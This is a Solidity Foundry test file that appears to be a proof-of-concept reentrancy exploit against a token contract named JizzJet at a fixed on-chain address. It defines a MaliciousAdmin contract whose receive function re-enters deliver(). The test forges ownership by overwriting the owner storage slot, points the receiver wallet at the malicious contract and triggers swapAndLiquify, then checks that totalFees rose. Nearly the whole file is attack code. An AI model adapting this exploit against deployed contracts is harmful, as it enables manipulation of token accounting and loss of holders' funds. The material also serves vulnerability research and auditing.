// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

interface IJizzJet {
    function _adminWalletAddress() external view returns (address payable);
    function _setReceiverWallet(address payable) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function deliver(uint256) external;
    function totalFees() external view returns (uint256);
    function owner() external view returns (address);
    function excludeFromFee(address) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function _taxFee() external view returns (uint256);
    function _liquidityFee() external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
}

contract MaliciousAdmin {
    IJizzJet public token;
    address public attacker;
    bool public reentered;

    constructor(IJizzJet _token, address _attacker) public {
        token = _token;
        attacker = _attacker;
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Re‑enter by calling deliver (a non‑guard‑protected function)
            token.deliver(1_000_000 * 1e18);
        }
    }
}

contract ExploitTest is Test {
    IJizzJet constant token = IJizzJet(0xf2a7429641d1b49a13dcb7e23b67a1a5101231f2);

    address constant DEPLOYER = 0x000000000000000000000000000000000000dEaD; // placeholder
    address constant ATTACKER = 0xbAbA0000000000000000000000000000000000bA;

    uint256 constant TOKEN_TRIGGER = 100_000_000 * 10**1 * 10**9 * 2; // > numTokensSellToAddToLiquidity

    function setUp() public {
        vm.label(address(token), "JizzJet");
        vm.label(ATTACKER, "Attacker");
        // Give attacker some BNB and tokens to work with
        deal(ATTACKER, 1000 ether);
        deal(address(token), ATTACKER, 1_000_000_000 * 1e18);

        // Impersonate owner: overwrite storage slot 0 (owner) with ATTACKER
        vm.store(address(token), bytes32(uint256(0)), bytes32(uint256(ATTACKER)));
    }

    function testReentrancy() public {
        // Deploy malicious admin contract
        MaliciousAdmin admin = new MaliciousAdmin(token, ATTACKER);

        // As owner (ATTACKER), set the admin wallet to the malicious contract
        vm.startPrank(ATTACKER);
        token._setReceiverWallet(payable(address(admin)));

        // Exclude attacker from fee to simplify accounting
        token.excludeFromFee(ATTACKER);
        token.excludeFromFee(address(this));

        // Pre‑exploit state
        uint256 feesBefore = token.totalFees();
        assertFalse(admin.reentered());

        // Trigger swapAndLiquify by transferring enough tokens to the token contract
        // The token contract's own balance will exceed numTokensSellToAddToLiquidity
        token.transfer(address(token), TOKEN_TRIGGER);

        vm.stopPrank();

        // At this point, the swapAndLiquify function executed; during the ETH transfer
        // to admin, the malicious contract's fallback re‑entered and called deliver().
        assertTrue(admin.reentered(), "Reentrancy should have occurred");

        // The deliver call increased totalFees beyond normal swap fees.
        uint256 feesAfter = token.totalFees();
        assertGt(feesAfter, feesBefore, "Reentrant deliver should increase totalFees");
    }
}
